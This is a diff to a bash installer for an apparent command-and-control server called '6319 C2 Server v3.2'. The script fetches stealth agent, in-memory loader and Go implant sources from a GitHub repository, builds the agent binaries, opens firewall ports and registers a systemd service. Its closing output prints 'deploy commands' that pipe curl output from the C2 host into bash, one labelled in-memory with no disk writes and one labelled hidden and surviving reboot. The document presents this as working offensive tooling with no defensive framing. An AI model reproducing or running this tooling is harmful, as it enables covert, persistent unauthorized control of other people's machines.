@@ -27,8 +27,17 @@ echo -e "${PURPLE}        C2 Server v3.2 Installer${N}"
 echo ""
 
 info() { echo -e "${AURORA}[+]${N} $1"; }
+step() { echo -e "${FROST}[>]${N} $1"; }
+done_step() { echo -e "${AURORA}[✓]${N} $1"; }
 warn() { echo -e "${YELLOW}[!]${N} $1"; }
 err() { echo -e "${RED}[-]${N} $1"; exit 1; }
+
+section() {
+    echo ""
+    echo -e "${FROST}━━━ $1 ━━━${N}"
+}
+
+START_TIME=$(date +%s)
 
 [[ $EUID -ne 0 ]] && err "Run as root: sudo bash install.sh"
 
@@ -45,67 +54,83 @@ generate_key() {
     echo "$key"
 }
 
+section "GENERATING CONFIGURATION"
+
+step "Generating random ports..."
 C2_WEB_PORT=$((5000 + RANDOM % 4000))
 C2_SOCKET_PORT=$((C2_WEB_PORT + 1))
+done_step "Web: ${FROST}${C2_WEB_PORT}${N} | Socket: ${FROST}${C2_SOCKET_PORT}${N}"
+
+step "Generating secure paths..."
 STEALTH_PATH=$(generate_path)
 PERSIST_PATH=$(generate_path)
 LOGIN_PATH=$(generate_path)
 DASHBOARD_PATH=$(generate_path)
+done_step "Login path: ${FROST}${LOGIN_PATH:0:8}...${N}"
+done_step "Dashboard path: ${FROST}${DASHBOARD_PATH:0:8}...${N}"
+
+step "Generating access key..."
 AUTH_KEY=$(generate_key)
 SESSION_SECRET=$(openssl rand -hex 32 2>/dev/null || cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 64 | head -n 1)
-
-info "Generated configuration:"
-echo -e "  Web Port:     ${C}${C2_WEB_PORT}${N}"
-echo -e "  Socket Port:  ${C}${C2_SOCKET_PORT}${N}"
-echo ""
+done_step "Auth key: ${YELLOW}${AUTH_KEY:0:12}...${N} (40 chars)"
 
 detect_os() {
+    step "Detecting operating system..."
     if [ -f /etc/os-release ]; then
         . /etc/os-release
         OS=$ID
+        OS_VERSION=$VERSION_ID
     elif [ -f /etc/redhat-release ]; then
         OS="rhel"
+        OS_VERSION="unknown"
     elif [ -f /etc/debian_version ]; then
         OS="debian"
+        OS_VERSION=$(cat /etc/debian_version)
     else
         OS=$(uname -s | tr '[:upper:]' '[:lower:]')
+        OS_VERSION="unknown"
     fi
-    info "Detected OS: $OS"
+    done_step "OS: ${FROST}${OS}${N} ${OS_VERSION}"
 }
 
 install_deps_debian() {
-    info "Installing dependencies (apt)..."
+    step "Updating package lists..."
     apt-get update -qq
+    step "Installing: python3, pip, venv, curl, git, wget..."
     apt-get install -y -qq python3 python3-pip python3-venv curl git wget >/dev/null 2>&1
+    done_step "APT packages installed"
 }
 
 install_deps_rhel() {
-    info "Installing dependencies (yum/dnf)..."
     if command -v dnf &>/dev/null; then
+        step "Installing via DNF: python3, pip, curl, git, wget..."
         dnf install -y python3 python3-pip curl git wget >/dev/null 2>&1
     else
+        step "Installing via YUM: python3, pip, curl, git, wget..."
         yum install -y python3 python3-pip curl git wget >/dev/null 2>&1
     fi
+    done_step "RPM packages installed"
 }
 
 install_deps_arch() {
-    info "Installing dependencies (pacman)..."
+    step "Installing via Pacman: python, pip, curl, git, wget..."
     pacman -Sy --noconfirm python python-pip curl git wget >/dev/null 2>&1
+    done_step "Pacman packages installed"
 }
 
 install_deps_alpine() {
-    info "Installing dependencies (apk)..."
+    step "Installing via APK: python3, pip, curl, git, wget..."
     apk add --no-cache python3 py3-pip curl git wget >/dev/null 2>&1
+    done_step "Alpine packages installed"
 }
 
 install_go() {
     if command -v go &>/dev/null; then
         GO_VER=$(go version | awk '{print $3}')
-        info "Go already installed: $GO_VER"
+        done_step "Go already installed: ${FROST}${GO_VER}${N}"
         return 0
     fi
     
-    info "Installing Go..."
     GO_VERSION="1.21.5"
     ARCH=$(uname -m)
     case "$ARCH" in
@@ -118,8 +143,11 @@ install_go() {
     GO_TAR="go${GO_VERSION}.linux-${GO_ARCH}.tar.gz"
     GO_URL="https://go.dev/dl/${GO_TAR}"
     
+    step "Downloading Go ${GO_VERSION} for ${GO_ARCH}..."
     cd /tmp
     wget -q "$GO_URL" -O "$GO_TAR" || curl -fsSL "$GO_URL" -o "$GO_TAR"
+    
+    step "Extracting to /usr/local/go..."
     rm -rf /usr/local/go
     tar -C /usr/local -xzf "$GO_TAR"
     rm -f "$GO_TAR"
@@ -130,7 +158,7 @@ install_go() {
         echo 'export PATH="/usr/local/go/bin:$PATH"' >> /etc/profile
     fi
     
-    info "Go installed: $(go version | awk '{print $3}')"
+    done_step "Go installed: ${FROST}$(go version | awk '{print $3}')${N}"
 }
 
 install_deps() {
@@ -147,47 +175,58 @@ install_deps() {
 }
 
 setup_firewall() {
-    info "Configuring firewall..."
+    step "Configuring firewall rules..."
     if command -v ufw &>/dev/null; then
         ufw allow ${C2_WEB_PORT}/tcp >/dev/null 2>&1 || true
         ufw allow ${C2_SOCKET_PORT}/tcp >/dev/null 2>&1 || true
-        info "UFW: ports ${C2_WEB_PORT}, ${C2_SOCKET_PORT} opened"
+        done_step "UFW: opened ports ${FROST}${C2_WEB_PORT}${N}, ${FROST}${C2_SOCKET_PORT}${N}"
     elif command -v firewall-cmd &>/dev/null; then
         firewall-cmd --permanent --add-port=${C2_WEB_PORT}/tcp >/dev/null 2>&1 || true
         firewall-cmd --permanent --add-port=${C2_SOCKET_PORT}/tcp >/dev/null 2>&1 || true
         firewall-cmd --reload >/dev/null 2>&1 || true
-        info "firewalld: ports ${C2_WEB_PORT}, ${C2_SOCKET_PORT} opened"
+        done_step "Firewalld: opened ports ${FROST}${C2_WEB_PORT}${N}, ${FROST}${C2_SOCKET_PORT}${N}"
     elif command -v iptables &>/dev/null; then
         iptables -I INPUT -p tcp --dport ${C2_WEB_PORT} -j ACCEPT 2>/dev/null || true
         iptables -I INPUT -p tcp --dport ${C2_SOCKET_PORT} -j ACCEPT 2>/dev/null || true
-        info "iptables: ports ${C2_WEB_PORT}, ${C2_SOCKET_PORT} opened"
+        done_step "iptables: opened ports ${FROST}${C2_WEB_PORT}${N}, ${FROST}${C2_SOCKET_PORT}${N}"
+    else
+        warn "No firewall detected, skipping"
     fi
 }
 
+section "SYSTEM DEPENDENCIES"
 detect_os
 install_deps
+
+section "GO TOOLCHAIN"
 install_go
 
 if systemctl is-active --quiet ${SERVICE_NAME} 2>/dev/null; then
-    info "Stopping existing service..."
+    step "Stopping existing service..."
     systemctl stop ${SERVICE_NAME}
+    done_step "Service stopped"
 fi
 
-info "Creating installation directory..."
+section "PYTHON ENVIRONMENT"
+
+step "Creating directory: ${FROST}/opt/6319${N}"
 rm -rf "$INSTALL_DIR"
 mkdir -p "$INSTALL_DIR/templates" "$INSTALL_DIR/static"
 cd "$INSTALL_DIR"
 
-info "Creating Python virtual environment..."
+step "Creating Python virtual environment..."
 python3 -m venv venv
 source venv/bin/activate
+done_step "Virtual environment created"
 
-info "Installing Python packages..."
+step "Installing pip packages: flask, socketio, nacl, gevent..."
 pip install --upgrade pip -q
 pip install flask flask-socketio pynacl gevent gevent-websocket requests -q
+done_step "Python packages installed"
 
-info "Creating source files..."
+section "EMBEDDED MODULES"
 
+step "Writing crypto.py (NaCl encryption)..."
 cat > crypto.py << 'CRYPTO_EOF'
 import os
 import secrets
@@ -253,24 +292,36 @@ class WebhookNotifier:
         except:
             pass
 WEBHOOKS_EOF
+done_step "Embedded modules written"
 
-info "Downloading source files from GitHub..."
+section "DOWNLOADING FROM GITHUB"
+
 GITHUB_RAW="https://raw.githubusercontent.com/44pie/6319/main"
 
+step "Downloading server.py..."
 curl -fsSL "${GITHUB_RAW}/server.py" -o server.py || err "Failed to download server.py"
+done_step "server.py downloaded"
+
+step "Downloading agent_stealth.py..."
 curl -fsSL "${GITHUB_RAW}/agent_stealth.py" -o agent_stealth.py || warn "Could not download agent_stealth.py"
+
+step "Downloading memfd_loader.py..."
 curl -fsSL "${GITHUB_RAW}/memfd_loader.py" -o memfd_loader.py || warn "Could not download memfd_loader.py"
+
 curl -fsSL "${GITHUB_RAW}/crypto.py" -o crypto.py 2>/dev/null || true
 curl -fsSL "${GITHUB_RAW}/webhooks.py" -o webhooks.py 2>/dev/null || true
+done_step "Python sources downloaded"
 
-info "Downloading Go agent sources..."
+section "GO AGENT BUILD"
+
+step "Downloading Go source files..."
 mkdir -p go/cmd/agent go/cmd/loader
 curl -fsSL "${GITHUB_RAW}/go/go.mod" -o go/go.mod || err "Failed to download go.mod"
 curl -fsSL "${GITHUB_RAW}/go/go.sum" -o go/go.sum 2>/dev/null || true
 curl -fsSL "${GITHUB_RAW}/go/cmd/agent/main.go" -o go/cmd/agent/main.go || err "Failed to download agent source"
 curl -fsSL "${GITHUB_RAW}/go/cmd/loader/main.go" -o go/cmd/loader/main.go || err "Failed to download loader source"
+done_step "Go sources downloaded"
 
-info "Building Go binaries..."
 mkdir -p bin
 cd go
 
@@ -284,31 +335,40 @@ case "$ARCH" in
     *) GOARCH="amd64" ;;
 esac
 
+step "Fetching Go dependencies..."
 go mod download 2>/dev/null || go mod tidy
+done_step "Dependencies fetched"
 
-info "Building agent for linux/${GOARCH}..."
+step "Compiling agent (linux/${GOARCH})..."
 GOOS=linux GOARCH=$GOARCH go build -ldflags="-s -w" -o ../bin/agent_linux_${GOARCH} ./cmd/agent/
+AGENT_SIZE=$(ls -lh ../bin/agent_linux_${GOARCH} 2>/dev/null | awk '{print $5}')
+done_step "Agent built: ${FROST}${AGENT_SIZE}${N}"
 
-info "Building loader for linux/${GOARCH}..."
+step "Compiling loader (linux/${GOARCH})..."
 GOOS=linux GOARCH=$GOARCH go build -ldflags="-s -w" -o ../bin/loader_linux_${GOARCH} ./cmd/loader/
+LOADER_SIZE=$(ls -lh ../bin/loader_linux_${GOARCH} 2>/dev/null | awk '{print $5}')
+done_step "Loader built: ${FROST}${LOADER_SIZE}${N}"
 
 cd ..
 
 if [ -f "bin/agent_linux_${GOARCH}" ]; then
-    info "Go binaries built successfully!"
-    ls -la bin/
+    done_step "Go binaries ready in ${FROST}/opt/6319/bin/${N}"
 else
     err "Failed to build Go binaries"
 fi
 
+section "WEB INTERFACE"
+
 mkdir -p templates static
 
-info "Downloading templates and static files..."
+step "Downloading templates..."
 curl -fsSL "${GITHUB_RAW}/templates/index.html" -o templates/index.html || err "Failed to download index.html"
 curl -fsSL "${GITHUB_RAW}/templates/login.html" -o templates/login.html || err "Failed to download login.html"
-curl -fsSL "${GITHUB_RAW}/static/style.css" -o static/style.css || err "Failed to download style.css"
+done_step "Templates downloaded (index.html, login.html)"
 
-info "Source files downloaded successfully!"
+step "Downloading static assets..."
+curl -fsSL "${GITHUB_RAW}/static/style.css" -o static/style.css || err "Failed to download style.css"
+done_step "Static assets downloaded (style.css)"
 
 : << 'EMBEDDED_TEMPLATES_DISABLED'
 cat > templates/index.html << 'INDEX_EOF'
@@ -567,7 +627,9 @@ header{display:flex;justify-content:space-between;align-items:center;padding-bot
 STYLE_EOF
 EMBEDDED_TEMPLATES_DISABLED
 
-info "Writing environment configuration..."
+section "CONFIGURATION"
+
+step "Writing environment file..."
 cat > .env << EOF
 C2_WEB_PORT=${C2_WEB_PORT}
 C2_SOCKET_PORT=${C2_SOCKET_PORT}
@@ -579,10 +641,13 @@ AUTH_KEY=${AUTH_KEY}
 SESSION_SECRET=${SESSION_SECRET}
 EOF
 chmod 600 .env
+done_step "Environment saved to ${FROST}.env${N}"
 
 setup_firewall
 
-info "Creating systemd service..."
+section "SYSTEMD SERVICE"
+
+step "Creating service file..."
 cat > /etc/systemd/system/${SERVICE_NAME}.service << EOF
 [Unit]
 Description=6319 C2 Server v3.2
@@ -601,40 +666,58 @@ RestartSec=5
 [Install]
 WantedBy=multi-user.target
 EOF
+done_step "Service file created"
 
-info "Enabling and starting service..."
+step "Reloading systemd daemon..."
 systemctl daemon-reload
-systemctl enable ${SERVICE_NAME}
-systemctl start ${SERVICE_NAME}
+done_step "Daemon reloaded"
 
+step "Enabling service..."
+systemctl enable ${SERVICE_NAME} >/dev/null 2>&1
+done_step "Service enabled (autostart on boot)"
+
+step "Starting service..."
+systemctl start ${SERVICE_NAME}
 sleep 2
 
 SERVER_IP=$(hostname -I | awk '{print $1}')
+END_TIME=$(date +%s)
+ELAPSED=$((END_TIME - START_TIME))
 
 if systemctl is-active --quiet ${SERVICE_NAME}; then
+    done_step "Service started successfully"
+    
     echo ""
-    echo -e "${FROST}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
-    echo -e "${AURORA}   6319 C2 Server v3.2 INSTALLED${N}"
-    echo -e "${FROST}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
+    echo -e "${FROST}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
+    echo -e "${AURORA}        6319 C2 Server v3.2 INSTALLED${N}"
+    echo -e "${FROST}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
     echo ""
-    echo -e "${PURPLE}[ACCESS - SAVE THIS]${N}"
-    echo -e "  Login:     ${FROST}http://${SERVER_IP}:${C2_WEB_PORT}/${LOGIN_PATH}${N}"
-    echo -e "  Dashboard: ${FROST}http://${SERVER_IP}:${C2_WEB_PORT}/${DASHBOARD_PATH}${N}"
-    echo -e "  Key:       ${YELLOW}${AUTH_KEY}${N}"
-    echo -e "  Session:   ${FROST}24 hours${N}"
+    echo -e "${PURPLE}ACCESS CREDENTIALS${N} ${SNOW}(save these!)${N}"
+    echo -e "  ${FROST}┌─${N} Login URL"
+    echo -e "  ${FROST}│${N}  ${SNOW}http://${SERVER_IP}:${C2_WEB_PORT}/${LOGIN_PATH}${N}"
+    echo -e "  ${FROST}├─${N} Dashboard URL"
+    echo -e "  ${FROST}│${N}  ${SNOW}http://${SERVER_IP}:${C2_WEB_PORT}/${DASHBOARD_PATH}${N}"
+    echo -e "  ${FROST}├─${N} Access Key"
+    echo -e "  ${FROST}│${N}  ${YELLOW}${AUTH_KEY}${N}"
+    echo -e "  ${FROST}└─${N} Session lifetime: ${FROST}24 hours${N}"
     echo ""
-    echo -e "${PURPLE}[DEPLOY COMMANDS]${N}"
+    echo -e "${PURPLE}DEPLOY COMMANDS${N}"
     echo ""
-    echo -e "${SNOW}Stealth (in-memory):${N}"
-    echo -e "  ${FROST}bash -c \"\$(curl -fsSL http://${SERVER_IP}:${C2_WEB_PORT}/${STEALTH_PATH})\"${N}"
+    echo -e "  ${SNOW}Stealth${N} ${FROST}(in-memory, no disk writes)${N}"
+    echo -e "  ${AURORA}bash -c \"\$(curl -fsSL http://${SERVER_IP}:${C2_WEB_PORT}/${STEALTH_PATH})\"${N}"
     echo ""
-    echo -e "${SNOW}Persist (survives reboot):${N}"
-    echo -e "  ${FROST}bash -c \"\$(curl -fsSL http://${SERVER_IP}:${C2_WEB_PORT}/${PERSIST_PATH})\"${N}"
+    echo -e "  ${SNOW}Persist${N} ${FROST}(hidden files, survives reboot)${N}"
+    echo -e "  ${AURORA}bash -c \"\$(curl -fsSL http://${SERVER_IP}:${C2_WEB_PORT}/${PERSIST_PATH})\"${N}"
     echo ""
-    echo -e "${PURPLE}[SERVICE]${N}"
-    echo -e "  Port:    ${FROST}${C2_WEB_PORT}${N} (web) / ${FROST}${C2_SOCKET_PORT}${N} (agents)"
-    echo -e "  Status:  ${FROST}systemctl status ${SERVICE_NAME}${N}"
-    echo -e "  Logs:    ${FROST}journalctl -u ${SERVICE_NAME} -f${N}"
+    echo -e "${PURPLE}SERVICE MANAGEMENT${N}"
+    echo -e "  ${FROST}Web Port:${N}     ${SNOW}${C2_WEB_PORT}${N}"
+    echo -e "  ${FROST}Agent Port:${N}   ${SNOW}${C2_SOCKET_PORT}${N} (encrypted)"
+    echo -e "  ${FROST}Status:${N}       systemctl status ${SERVICE_NAME}"
+    echo -e "  ${FROST}Logs:${N}         journalctl -u ${SERVICE_NAME} -f"
+    echo -e "  ${FROST}Config:${N}       /opt/6319/.env"
+    echo ""
+    echo -e "${FROST}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
+    echo -e "${AURORA}Completed in ${SNOW}${ELAPSED}${AURORA} seconds${N}"
     echo ""
 else
     err "Service failed to start. Check: journalctl -u ${SERVICE_NAME} -n 50"
